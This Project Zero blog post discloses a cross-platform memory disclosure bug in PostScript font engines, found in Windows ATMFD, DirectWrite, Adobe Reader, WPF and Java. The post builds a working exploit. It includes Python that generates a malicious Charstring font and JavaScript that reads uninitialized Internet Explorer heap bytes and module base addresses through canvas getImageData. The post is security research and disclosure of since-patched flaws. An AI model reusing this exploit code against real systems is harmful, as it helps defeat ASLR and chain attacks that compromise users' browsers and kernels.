# Enabling QR codes in Internet Explorer, or a story of a cross-platform memory disclosure - Project Zero

Source: https://projectzero.google/2015/09/enabling-qr-codes-in-internet-explorer.html
Captured verbatim (article body extracted from HTML) on 2026-11-12.

---

Posted by Mateusz Jurczyk of Google Project Zero

In the previous series of posts (parts [#1](/2015/07/one-font-vulnerability-to-rule-them-all.html) [#2](/2015/08/one-font-vulnerability-to-rule-them-all.html) [#3](/2015/08/one-font-vulnerability-to-rule-them-all_13.html) [#4](/2015/08/one-font-vulnerability-to-rule-them-all_21.html)), we discussed the exploitation process of a serious “blend” vulnerability (CVE-2015-0093 / CVE-2015-3052), which was special in that it provided the attacker with an extremely powerful primitive (arbitrary out-of-bounds stack operations) allowing a fully reliable arbitrary remote code execution, and affected both a client-side application – Adobe Reader – and the Microsoft Windows kernel. While that bug was definitely the most severe and technically challenging issue discovered during my Type 1 / OpenType Charstring research conducted several months ago, it was not the only one affecting multiple platforms and certainly not the only interesting one.

In today’s post, I would like to explain the root cause and exploitation of a memory disclosure vulnerability discovered in four different products sharing a common ancestor of their PostScript font engines: the ATMFD.DLL module in the Windows kernel ([CVE-2015-0089](https://code.google.com/p/google-security-research/issues/detail?id=176), fixed in March), Adobe Reader ([CVE-2015-3049](https://code.google.com/p/google-security-research/issues/detail?id=248), fixed in May), DirectWrite ([CVE-2015-1670](https://code.google.com/p/google-security-research/issues/detail?id=259), fixed in May) and Windows Presentation Foundation ([CVE-2015-1670](https://code.google.com/p/google-security-research/issues/detail?id=277), fixed in May). Additionally, Oracle Java was also affected by the problem ([CVE-2015-2619](https://code.google.com/p/google-security-research/issues/detail?id=281), fixed in July), even though it used a different implementation. When successfully exploited, the security flaw would allow an attacker to leak uninitialized memory from the process heap or kernel pools, potentially leading to the disclosure of sensitive information or facilitating the exploitation of a more serious bug by helping defeat exploit mitigations. Both 32 and 64-bit builds of the affected software were prone to the vulnerability. Similarly to the “blend” issue, due to the cross-platform nature of the bug, it could be used in an exploit chain together with memory corruption bugs to e.g. provide a de-ASLR primitive for a user-mode application (in order to achieve RCE) and then the kernel itself (to escape the sandbox or otherwise elevate attacker’s privileges).

As such, the bug would generally allow uninitialized memory to be reflected in the final glyph’s shape as rasterized on the display. Therefore, in order to actually take advantage of it, it is also necessary to have a way of reading the pixels back and recovering the original uninitialized bytes. We are not currently aware of any such way to attack Adobe Reader (the vendor still decided to fix the issue in case it became exploitable in the feature), and we have not developed a functional proof of concept for WPF or Java either, considering them marginal attack vectors. The two most important pieces of software where the bug could matter the most are the Windows kernel and DirectWrite library.

Nowadays, there are few to none client programs using Windows GDI for font rasterization and offering the capability to read pixels back by the attacker-controlled input file (for example Google Chrome used GDI in the past, but [only until mid 2014](http://blog.chromium.org/2014/07/chrome-37-beta-directwrite-on-windows.html)). Consequently, the kernel instance of the bug would only be useful in a local scenario, when the attacker already executes arbitrary code on the machine (perhaps in a sandboxed environment) and tries to elevate their privileges or steal sensitive data from the kernel address space.

On the other hand, the [DirectWrite](<https://msdn.microsoft.com/en-us/library/windows/desktop/dd368038(v=vs.85).aspx>) library is used by a number of Windows web browsers which support the HTML5 \<canvas> tag and related Javascript methods such as [fillText](http://www.w3schools.com/tags/canvas_filltext.asp) or [getImageData](http://www.w3schools.com/tags/canvas_getimagedata.asp), making it possible for a website to retrieve the rasterized text’s pixels back and either act upon them (to exploit another bug), or send them to a remote server. Specifically, DirectWrite is used by the three most widespread browsers: Chrome, Firefox and Internet Explorer, which would normally make all of them susceptible to the bug. However, both Chrome and Firefox use a precaution mechanism in the form of a [OpenType Sanitiser](https://code.google.com/p/ots/) library, which validates each untrusted font file downloaded from the web before feeding it to the underlying font rasterizer. Since OTS is based on a whitelisting paradigm, it only allows a very narrow set of Charstring instructions sufficient for 99.9% valid fonts to work correctly, and performs strict checking of a number of OpenType tables as well. In this specific case, it explicitly bans the “get” instruction required to take advantage of the vulnerability, although for an unrelated reason (the infeasibility to bounds-check the index argument):

| case ots::kPut: | 
| case ots::kGet: | 
| case ots::kIndex: | 
| // For now, just call OTS\_FAILURE since there is no way to check whether the | 
| // index argument, \|i\|, is out-of-bounds or not. Fortunately, no OpenType | 
| // fonts I have (except malicious ones!) use the operators. | 
| // TODO(yusukes): Implement them in a secure way. | 
| return OTS\_FAILURE(); | 

As a result, this leaves us with just Internet Explorer as the only truly vulnerable browser, making it the main focus of this post. Before we get to the exploitation part, let’s first learn about the bug itself.

# Transient arrays and the vulnerability

The “transient array” structure is a fully accessible array of 32-bit numeric entries, which is persistent throughout the execution of a single Charstring program. It is a part of the Charstring execution environment (together with the instruction stream and operand stack), and can be thought of as a helper storage with random read/write access.

In Type 1 fonts, it can be pre-initialized by specifying a “/BuildCharArray” array in the Private Dictionary, and its size can be arbitrarily controlled by a 16-bit “/lenBuildCharArray” entry of type “number”. In OpenType fonts, the length could initially also be controlled via a “lenBuildCharArray” field as part of a “MultipleMaster” operator in the CFF data – that was between 1998 and 2000, when the multiple masters extension was part of the official OpenType/CFF specification (see The Compact Font Format Specification, Technical Note #5176, Version 1.0, 18 March 1998). Once the extension was removed from the subsequent revision of the specs in 2000, the length of the transient array was fixed at 32 entries (each 32-bit wide), as distinctly noted in the implementation limits table shown in Figure 1.

Figure 1. Implementation limits of Type 2 Charstring interpreters (source: The Type 2 Charstring Format, Adobe Systems Inc.)

There are generally four instructions which can be used to access the transient array:

1. “get” – copies data from transient array to operand stack.
2. “put” – copies data from operand stack to transient array.
3. “load” – copies data from registry object to transient array (deprecated).
4. “store” – copies data from transient array to registry object (deprecated).

The “load” and “store” instructions were in fact part of the multiple masters functionality (together with the “registry object”), and thus officially deprecated in 2000. However, they are still supported in the Windows kernel (ATMFD.DLL) and were even prone to a severe security issue ([CVE-2015-0090](https://code.google.com/p/google-security-research/issues/detail?id=177)), which we managed to exploit for a reliable privilege escalation on Windows 8.1 Update 1 x64. While these instructions are not relevant to this blog post, please refer to part #4 of the “One font vulnerability to rule them all” post series for more information on this obsolete feature.

The “get” and “put” instructions are more interesting here, as they allow values to be transferred directly between the two core data structures Charstrings operate on. In the “get” instruction section of the Type 2 Charstring specs, the following warning can be found:


If get is executed prior to put for i during execution of the current charstring, the value returned is undefined.

This definitely makes sense, as no valid font should attempt to read from a transient array index that has not been previously initialized. On the other hand, the term “undefined behavior” used in a specification should raise any bughunter’s eyebrow. What happens if we actually perform such an action? You guessed it – a junk 32-bit value which accidentally occupies the memory of the underlying transient array allocation will be copied to the operand stack, which is the culprit of the vulnerability.

The Charstring interpreters found in all affected programs and systems exhibit the same behavior – they lazily allocate the transient array upon first access, and until recently, none of them pre-initialized the memory area prior to making it accessible to the executed font program. As a result, a malicious Charstring could copy any of the uninitialized 32 dwords (in case of OpenType, which is supported by all vulnerable software) or N dwords (in case of Type 1, supported by ATMFD.DLL and Java) to the operand stack, and further work with the value to fully and clearly represent them in the shape drawn by the rasterizer.

While setting the glyph’s program to a “x get” instruction sequence to trigger the vulnerability is a trivial task, constructing the rest of the PostScript program such that the full 32-bit value is reflected on the display is indefinitely more challenging. The next section outlines the steps necessary to generate a universal OpenType font whose glyphs represent the uninitialized data obtained by the “get” instruction invocations, which can be later used to read the bytes back in various vulnerable environments.

# Building the exploit font

The choice of using an OpenType font as a proof of concept is dictated by the fact that the format is supported by all affected pieces of software, while Type 1 doesn’t work with DirectWrite; however, the vulnerability could be exploited with both formats in products which support them. For example, Type 1 fonts could be used to disclose uninitialized memory from an arbitrarily-sized pool allocation in the Windows kernel, while .OTF are limited to a fixed-size array, so using the older format might be more useful in some scenarios.

Back to OpenType, we know from the previous section that the transient array is always 32 element long, each of them 32-bit wide. As a result, it is possible to disclose 1024 bits (or 128 bytes) with a single glyph. This is a rather convenient size, as dynamic memory regions of size 128 are typically allocated from low-fragmentation heaps or pools, frequently reusing a range of bytes that was previously occupied by a freed allocation. On the downside, we are limited to this one, specific length, and therefore have somewhat little control over which past allocations will be assigned to the transient array.

In order to reflect the disclosed bytes in a way easy to read back, let’s assume that the “canvas” we are drawing on is a square of 2048x2048 units, divided into a matrix of 32 rows and 32 columns of width/height 64 units. As a result, we end up with 1024 squares of size 64x64, with each square representing a single disclosed bit. Furthermore, each of the 32 columns will represent one dword from the transient array. This concept is illustrated in Figure 1.

Figure 1. The representation of disclosed transient array entries on the glyph matrix.

If we take a random OpenType font from disk as a template, we first have to set the width and height of the glyphs used for the disclosure to 2048 in the “hmtx” and “vmtx” tables, respectively (changing several other metrics-related fields might be required, too). This can be trivially achieved by using the ttx.py font (de)compiler of the [fonttools](https://github.com/behdad/fonttools/) suite, which is capable of converting TTF/OTF fonts to a human-readable XML representation and back. The rest of the work is to be performed directly in the Charstring program.

An important thing to note is that while the operand stack consists of 32-bit values, various instructions can interpret them in various ways – some will use the full width, while other will treat it as a Fixed 16.16 value and only use the integer part (high 16 bits). Furthermore, font (de)compilers such as ttx.py or (de)type1 from the [AFDKO](http://www.adobe.com/devnet/opentype/afdko.html) suite apply their own logic to control when values are encoded as 16.16 or 32-bit values. On the other hand, it is essential for us to maintain complete control over how the operand values are stored on the stack so that they are correctly used by the corresponding instructions. As a result, I have created my own simplistic implementation of the CFF format in Python, in order to be able to operate directly on the binary representation of Charstring opcodes and eliminate the potentially unpredictable compiler behavior. While full source code of the parser will not be shared, I will quote the portions responsible for generating the exploit PostScript program.

To begin with, I defined two functions designed to push immediate numbers on the stack – the first one, “enc”, performs a regular encoding according to the Type 1 / Type 2 specification, while “enc\_dword” always uses the special opcode 255 to make sure that the value is pushed as a dword. Both of them are shown in the listing below:

def enc(x):

if (x >= -107) and (x \<= 107):

return struct.pack('B', x + 139)

elif (x >= 108) and (x \<= 1131):

b1 = (x - 108) % 256

b0 = ((x - 108 - b1) / 256) + 247

return struct.pack('BB', b0, b1)

elif (x >= -1131) and (x \<= -108):

x = -x

b1 = (x - 108) % 256

b0 = ((x - 108 - b1) / 256) + 251

return struct.pack('BB', b0, b1)

elif (x >= -32768) and (x \<= 32767):

return struct.pack('>Bh', 28, x)

elif (x >= -(2\*\*31)) and (x \<= 2\*\*31 - 1):

return struct.pack('>Bi', 255, x)

elif (x \<= 2\*\*32 - 1):

return struct.pack('>BI', 255, x)

raise "Unable to encode value %x" % x


def enc\_dword(x):

if (x >= -(2 \*\* 31) and x \<= 0):

return struct.pack('>Bi', 255, x)

elif (x \<= 2\*\*32 - 1):

return struct.pack('>BI', 255, x)

raise "Unable to encode value %x" % x

Now, with the assumptions established above and the fact that we are starting drawing from point (0, 0), the memory disclosure algorithm could look like the following:

initialize cursor at (0, 0)

for each of the 32 transient array items (x):

for each of the 32 bits in the item (y):

leak y-th bit of transient array entry \`x\`

if disclosed bit is set:

draw a 64x64 square

move the pointer up by 64 units

move the pointer right by 64 and down by 2048 units (start a new column)

end character outline

Since loops are not supported in PostScript fonts (or any other forms of jumps for that matter, contrary to TrueType programs), the two “for” loops will have to be located in the Python Charstring generation code instead, unfortunately resulting in a lot of code duplication and a very long disclosure procedure, as each of the 1024 bits will be leaked and drawn by a separate piece of Charstring code.

## Extracting bits off 32-bit values

Let’s start with the bit-leaking primitive. Ideally, we would want a function of prototype leak\_bit(dword, bit), which would return Charstring code resulting in having the given bit of the specified transient array index pushed on the operand stack as either 0 or 1. In the code snippets below, I will use my custom Python wrappers for the PostScript instructions, implemented in the following manner:


def exch(num1, num2):

return (num1 + num2 + EXCH\_OPCODE)

One way to extract a specific bit value from a 32-bit dword with the instructions available in Type 1 and Type 2 Charstrings is as follows:

1. Clear all bits more significant than the one we are trying to leak by using the “ifelse” and “sub” operators.
2. Perform a 32-bit comparison of the resulting value with 2bit. If it’s greater or equal (the bit is set), return 1, otherwise 0.

Now, let’s work on the example value 0xDEADBEEF. Since items on the operand stack are treated as signed integers, we might run into problems if the most significant bit is set (indicating a negative value), as then the comparison in step 2 would always have the same result. Therefore, let’s start the function with handling the special case of extracting the 31st (most significant) bit of the dword:

if bit == 31:

payload = ifelse(enc(0), enc(1), enc(0), get(enc(dword)))

Here, we are using the “ifelse” instruction to compare the 32-bit disclosed value (4th argument) with 0 (3rd argument), and end up with 1 on the stack if it’s lower (2nd argument), or 0 otherwise (1st argument). Easy and simple. Interpreted as a signed 32-bit integer, 0xDEADBEEF is a negative number (-559038737), resulting in “ifelse” putting “1” on the stack, which indeed corresponds to the highest bit in the value.

To also work around the signedness issue when requesting bits other than 31, we have to reset the most significant one to enable unsigned arithmetic later on:


else:

payload = sub(get(enc(dword)), ifelse(enc(0), enc\_dword(2 \*\* 31), enc(0), get(enc(dword))))

Here, subtraction takes place between the uninitialized value and either 0—if the value is greater or equal 0 (msb is clear)—or 0x80000000 (231) if the bit is set. Consequently, the resulting number on the operand stack has the 31st bit zeroed out; in our case, 0xDEADBEEF would be converted to 0x5EADBEEF. Now, we would also like to clear all bits more significant than the one we’re interested in, say the 28th one. This can be accomplished in a similar fashion with a combination of “sub” and “ifelse” instructions – if the intermediate number is greater or equal to 2n for a decreasing value of n, then 2n is subtracted, clearing the corresponding bit (otherwise it’s already zero):

for i in range(30, bit, -1):

payload += sub("", ifelse(enc(0), enc\_dword(2 \*\* i), index(enc(2)), enc\_dword((2 \*\* i) - 1)))

The range starts with bit 30, as the 31st one was separately handled above. The first parameter to the “sub” operator is empty to note the fact that we are operating on an intermediate value that already resides on the operand stack as a result of the previous code. Furthermore, the “index” instruction with parameter “2” is used to copy the value two items below the top of the stack (the intermediate dword being disclosed) to the top of the stack to use it for comparison. For our current value of 0x5EADBEEF, the following two iterations of the loop are executed:


1. 0x5EADBEEF is compared with 230 (0x40000000), and since it is greater or equal, subtraction takes place, resulting in a new intermediate value of 0x1EADBEEF.
2. 0x1EADBEEF is compared with 229 (0x20000000), and since it is smaller, no operation takes place (in the form of subtraction with 0), retaining the original value on the stack.

At this point, the only thing left is to compare the resulting value with 2bit, and push 0 or 1 on the stack depending on whether it is greater or equal, or smaller than the power of 2:

payload += exch("", ifelse(enc(0), enc(1), index(enc(2)), enc\_dword((2 \*\* bit) - 1))) + drop()

Once the “ifelse” executes, the stack has two values on it: the extracted bit (on top) followed by the intermediate value. As the “leak\_bit” function is supposed to generate code which only leaves the result on the stack and doesn’t clobber it with other data, we have to finally exchange the two dwords and drop the now topmost one. In our case, 0x1EADBEEF is compared with 228 (0x10000000), and since it is greater or equal, “1” is left on the stack by “ifelse”, followed by the clean up done by the “exch” and “drop” operators. We have now successfully extracted the 28th bit of the dword in our example, and more generally developed a leak\_bit(dword, bit) function to reliably obtain any of the 32 bits of any chosen item in the transient array. Let’s now proceed to reflecting the value on the display by drawing some actual shapes.

## Drawing the bit matrix

As previously mentioned, for each of the 32 dwords we will draw a separate column of 32 squares for each bit. First of all, we should start by initializing the cursor position at (0, 0):

payload = rmoveto(enc(0), enc(0))

In order to draw the square, we can use the “rlineto” instruction, which takes one or more (x, y) pairs and creates lines based on the relative coordinates. While we cannot execute the operator conditionally, we can calculate the operands such that they form a square if the disclosed bit is set, or an empty set if it is zero. This can be achieved using the stream of instructions shown in Figure 2.

Figure 2. PostScript instructions generating operands for the “rlineto” operator.

If the bit returned by the “leak\_bit” function is 1, then the following values will be pushed to the operand stack:


64 0 0 64 -64 0 0 -64

which translates to a square outline:

On the other hand if the bit is zero, all eight parameters to “rlineto” will be zero, effectively resulting in a no-op. After each such “rlineto” operation, we additionally have to move the cursor up by 64 units. Likewise, we have to remember to move the cursor back to the bottom of the matrix and next row on each new transient array item, and to mark the end of drawing with the “endchar” instruction. The Python code generating a full PostScript program disclosing 128 bytes of uninitialized transient array memory is shown below:

payload = rmoveto(enc(0), enc(0))

for dword in range(32):

for bit in range(32):

payload += (rlineto(\[(mul(leak\_bit(dword, bit), enc(unit)), enc(0)),

(enc(0), index(enc(2))),

(neg(dup()), enc(0)),

(enc(0), index(enc(2)))\]) +

rmoveto(enc(0), enc(unit)))

payload += rmoveto(enc(unit), enc(-unit \* 32))

payload += endchar()

In my proof of concept file, I installed this Charstring in letters “a” to “z”. Additionally, I also assigned a test disclosure program to letter “A”, which—instead of leaking any actual bits from memory—returns bits from predefined values 0x55555555 (bit pattern 010101...) and 0xAAAAAAAA (bit pattern 101010...) alternately:

def leak\_test\_bit(dword, bit):

if dword & 1:

test\_dword = 0x55555555

else:

test\_dword = 0xaaaaaaaa

return enc((test\_dword & (1 \<\< bit)) >> bit)

If the drawing algorithm is implemented correctly, the test glyph of letter “A” should be displayed as a checkered pattern:

This can be conveniently used to both manually inspect that the Charstring program works, and also programmatically synchronize the algorithm reading the memory back, as shown in one of the next sections.

## Example results

Right now, we have a universal .OTF file which renders potentially uninitialized transient array contents on the display. The nice thing about it is that the only violation committed by the font is reading array entries that have not been previously written to, a condition that we find quite easy to miss while developing a Charstring interpreter. In this form, it is ready to be used for testing various engines for potential bugs, whose presence is easily revealed by variable, “non-deterministic” shapes of the glyph outlines. Figures 3, 4, 5 and 6 show the results of loading such a test OpenType font in vulnerable versions of Microsoft Windows, Internet Explorer, Windows Presentation Foundation and Oracle Java respectively. In all cases, the bug was obviously there; we suspect that the reason for Java not properly rasterizing the matrix is caused by the fact that it doesn’t support some of the Charstring instructions used in the exploit.

Figure 3. The exploit OpenType font rendered by a vulnerable Windows 7.

Figure 4. The exploit OpenType font rendered in Internet Explorer 11 using vulnerable DirectWrite.
Figure 5. The exploit OpenType font rendered in a vulnerable Windows Presentation Foundation environment.

Figure 6. The exploit OpenType font rendered in a vulnerable Oracle Java environment.

# Disclosing Internet Explorer’s memory to Javascript

One of the most intuitive uses of the vulnerability would be to exploit it from Javascript in order to read Internet Explorer’s heap bytes, trying to locate a heap (or other) address in order to facilitate the exploitation of another vulnerability (e.g. a use-after-free or memory corruption). Information disclosure issues are of much value for browser exploit developers these days, as all widely used browsers employ exploit mitigations such as ASLR and DEP. In this section, we will show how a malicious website could embed the exploit font, have the browser display the leaked portions of heap memory, and read the data back using the HTML5 \<canvas> tag.

Embedding custom OpenType fonts in websites for Internet Explorer (starting with version 9) is as simple as defining a new font face and a corresponding style in CSS:

\<style>

@font-face {

font-family: custom\_font;

src: url(PATH TO FONT);

}

#custom\_font {

font-family: custom\_font;

}

\</style>

The remainder of the exploit will be written in JavaScript. First, let’s define some important constants:


var kDimensions = 128;

var kDataRows = 32;

var kDataColumns = 32;

var kSyncChar = 0x41;

var kLeakChar = 0x61;

Here, kDimensions will be used as the point size in which the glyphs will be rendered. kDataRows and kDataColumns specify the dimensions of the matrix represented by each glyph; since in case of OpenType we have 32 dwords of 32 bits, the constants are set accordingly. Furthermore, kSyncChar specifies the special character used for synchronization/calibration (“A” in our case), and finally kLeakChar is the character providing the actual memory disclosure primitive (“a” in our case).

Next, we have to initialize the environment – make sure that kDimensions is divisible by the numbers of rows and columns:

try {

if ((kDimensions % kDataRows) != 0 || (kDimensions % kDataColumns) != 0) {

throw new Error('Dimensions not divisible by number of bit rows or columns.');

}

create a [canvas](http://www.w3schools.com/html/html5_canvas.asp) element to draw on with dimensions sufficient for the synchronization and leaking glyph, and append it to the document body:

var canvas = document.createElement('canvas');

canvas.id = 'c';

canvas.width = 2 \* kDimensions;

canvas.height = kDimensions;

document.body.insertBefore(canvas, document.body.firstChild);

and actually rasterize the synchronization and memory-leaking glyphs (triggering the vulnerability):

var ctx = canvas.getContext('2d');

ctx.fillStyle = 'rgb(255, 0, 0)';

ctx.font = kDimensions + 'px custom\_font';

ctx.fillText(String.fromCharCode(kSyncChar) + String.fromCharCode(kLeakChar), 0, kDimensions);

Before trying to extract any of the browser’s memory, let’s first make sure that the special character was correctly drawn on the canvas by reading the 0x55 and 0xAA bytes that it represents and verifying that all of them were correctly extracted:

var imgd = ctx.getImageData(0, 0, kDimensions, kDimensions);

var synch\_success = true;

synch\_bytes = readBytes(imgd.data, kDimensions, kDataRows, kDataColumns);


if (synch\_bytes.length == 128) {

for (var i = 0; i \< synch\_bytes.length; i++) {

var expected\_byte;

if (Math.floor(i / 4) % 2 == 0) {

expected\_byte = 0xAA;

} else {

expected\_byte = 0x55;

}

if (synch\_bytes\[i\] != expected\_byte) {

synch\_success = false;

break;

}

}

} else {

synch\_success = false;

}


if (!synch\_success) {

throw new Error('Synchronization failed.');

}

The “readBytes” function is the core of the HTML/Javascript part of the exploit, implemented as follows:


function readBytes(data, dim, rows, cols) {

var bytes = \[\];

var hbit\_dim = dim / cols;

var vbit\_dim = dim / rows;

var cur\_byte = 0;

var accumulated\_bits = 0;


for (var x = 0; x \< dim; x += hbit\_dim) {

for (var y = dim - 1; y >= 0; y -= vbit\_dim) {

cur\_byte |= Boolean(data\[((y \* dim) + x) \* 4\]) \<\< accumulated\_bits;

accumulated\_bits++;


if (accumulated\_bits == 8) {

bytes.push(cur\_byte);

accumulated\_bits = 0;

cur\_byte = 0;

}

}

}


return bytes;

}

The body of the routine is generally quite self explanatory – it iterates over each column and row, accumulating the bits and storing full bytes in an array, then returning them to the caller. Lastly, we have to invoke the function once again to read the uninitialized bytes and print them out on the screen:

var output = document.getElementById('output');

imgd = ctx.getImageData(kDimensions, 0, kDimensions, kDimensions);

leaked\_bytes = readBytes(imgd.data, kDimensions, kDataRows, kDataColumns);


for (var i = 0; i \< leaked\_bytes.length; i++) {

output.innerText += ('0' + leaked\_bytes\[i\].toString(16)).substr(-2) + ' ';

}

} catch (err) {

alert('Error: ' + err.message);

}

At this point, the exploit is ready and functional. Once we open the website on a vulnerable version of Internet Explorer, we might see the following dump of 128 leaked bytes:

f0 00 62 74 00 00 00 00 00 00 00 00 00 00 00 00

00 00 00 00 cd c5 ae c3 02 00 00 00 26 00 00 00

78 bb f6 08 48 d8 01 00 20 bc f6 08 14 00 00 00

f0 a8 79 06 01 01 b7 73 c0 f7 04 01 08 00 00 00

02 00 00 00 00 00 00 00 00 00 00 00 e0 3e 02 01

c0 f7 04 01 08 00 00 00 60 49 87 04 08 ac 7c 3f

02 00 00 00 00 00 00 00 20 4e a1 06 c0 f7 04 01

08 00 00 00 00 00 00 00 b0 f7 04 01 08 ac 7c 3f

As it turns out, the nature of the disclosed memory region is very consistent across a number of tests in our environment (Windows 7 64-bit, Internet Explorer 11 32-bit). Specifically, the first dword in the leak always contains the base address of the DirectWrite (DWrite.DLL) module, and the area also has a number of heap addresses at constant offsets (shown in bold). If we additionally output some more debug information, extract and display the disclosed addresses in Javascript and attach a debugger to the browser process, we will see that the heap addresses are indeed valid, and the base address of the DWrite.DLL module is correctly leaked too, as shown in Figure 7.

Figure 7. The OpenType exploit disclosing multiple addresses in Internet Explorer process address space.

The above example clearly illustrates how the vulnerability could be used by an exploit to learn about the virtual address space of Internet Explorer, which could greatly help in the exploitation of another flaw (e.g. by making it possible to construct a ROP chain based on the DirectWrite base address).

If not for OpenType Sanitiser, Chrome and Firefox would be prone to the bug, too. We believe that the decision to use the OTS library as an additional layer of protection was extremely wise, as it largely reduced the font-related attack surface to the most basic features of the formats (sufficient to use almost all regular fonts), while most issues are typically discovered in the implementation of old, obsolete, non-standard parts of specifications – and especially those explicitly mentioning the possibility of “undefined” behavior.

# Conclusion

While some DirectWrite clients were not affected by the vulnerability, it was still the most common bug of all found during my Charstring security research, present in virtually all PostScript font engines I have tested. The vulnerable Windows kernel (specifically ATMFD) could be attacked in an analogous way, either by using the very .OTF font developed in this post, or a new Type 1 one (in order to maintain more control over the size of the disclosed allocation). The only difference for the OS exploit would be the usage of API functions to rasterize the glyphs and read pixels back, and any user-mode code (not subject to the win32k lockdown) could leak the contents of the kernel pools, which is definitely a useful primitive in the times of Microsoft enforcing kernel ASLR in recent versions of Windows. This also demonstrates how security flaws spanning across multiple pieces of software (e.g. due to shared codebases) are many times more impactful compared to “normal” ones found in a single program.

I hope you have enjoyed the post, and am looking forward to publishing further articles regarding font security.
